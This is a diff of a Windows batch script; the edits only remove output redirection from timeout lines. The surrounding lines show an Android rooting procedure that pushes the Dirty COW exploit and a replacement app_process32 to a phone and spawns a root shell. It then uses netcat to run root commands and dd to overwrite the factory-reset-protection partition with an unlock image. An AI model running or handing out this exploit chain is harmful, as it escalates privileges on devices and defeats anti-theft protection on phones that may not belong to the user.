@@ -23,25 +23,25 @@ adb wait-for-device
 ::cls
 echo [*] copying dirtycow to /data/local/tmp/dirtycow
 adb push pushed/dirtycow /data/local/tmp/dirtycow
-timeout 10 > nul
+timeout 10
 echo [*] copying recowvery-app_process32 to /data/local/tmp/recowvery-app_process32
 adb push pushed/recowvery-app_process32 /data/local/tmp/recowvery-app_process32
-timeout 10 > nul
+timeout 10
 echo [*] copying frp.bin to /data/local/tmp/unlock
 adb push pushed/frp.bin /data/local/tmp/unlock
-timeout 10 > nul
+timeout 10
 echo [*] copying busybox to /data/local/tmp/busybox
 adb push pushed/busybox /data/local/tmp/busybox
-timeout 10 > nul
+timeout 10
 echo [*] copying cp_comands.txt to /data/local/tmp/cp_comands.txt
 adb push pushed/cp_comands.txt /data/local/tmp/cp_comands.txt
-timeout 10 > nul
+timeout 10
 echo [*] copying dd_comands.txt to /data/local/tmp/dd_comands.txt
 adb push pushed/dd_comands.txt /data/local/tmp/dd_comands.txt
-timeout 10 > nul
+timeout 10
 echo [*] changing permissions on copied files
 adb shell chmod 0777 /data/local/tmp/*
-timeout 10 > nul
+timeout 10
 ::cls
 echo.--------------------------------------------------------------------------------------------
 echo [*] DONE PUSHING FILES TO PHONE. NOW WE ARE GOING TO TEMP WRITE OVER THE APP_PROCESS
@@ -56,7 +56,7 @@ echo.---------------------------------------------------------------------------
 echo.--------------------------------------------------------------------------------------------
 echo [*]WAITING 60 SECONDS FOR ROOT SHELL TO SPAWN
 echo [*] WHILE APP_PROCESS IS REPLACED PHONE WILL APPEAR TO BE UNRESPONSIVE BUT SHELL IS WORKING
-timeout 60 > nul
+timeout 60
 echo.--------------------------------------------------------------------------------------------
 echo [*] OPENING A ROOT SHELL ON THE NEWLY CREATED SYSTEM_SERVER
 echo [*] MAKING A DIRECTORY ON PHONE TO COPY FRP PARTION TO 
@@ -68,11 +68,11 @@ adb shell "/data/local/tmp/busybox nc localhost 11112 < /data/local/tmp/cp_coman
 echo [*] COPYING UNLOCK.IMG OVER TOP OF COPIED FRP IN /data/local/test NOT AS ROOT WITH DIRTYCOW
 echo [*]
 adb shell /data/local/tmp/dirtycow /data/local/test/frp /data/local/tmp/unlock
-timeout 5 > nul
+timeout 5
 ::cls
 pause
 echo [*] WAITING 5 SECONDS BEFORE WRITING FRP TO EMMC
-timeout 5 > nul
+timeout 5
 echo [*] DD COPY THE NEW (UNLOCK.IMG) FROM /data/local/test/frp TO PARTITION mmcblk0p17
 adb shell "/data/local/tmp/busybox nc localhost 11112 < /data/local/tmp/dd_comands.txt"
 echo.--------------------------------------------------------------------------------------------
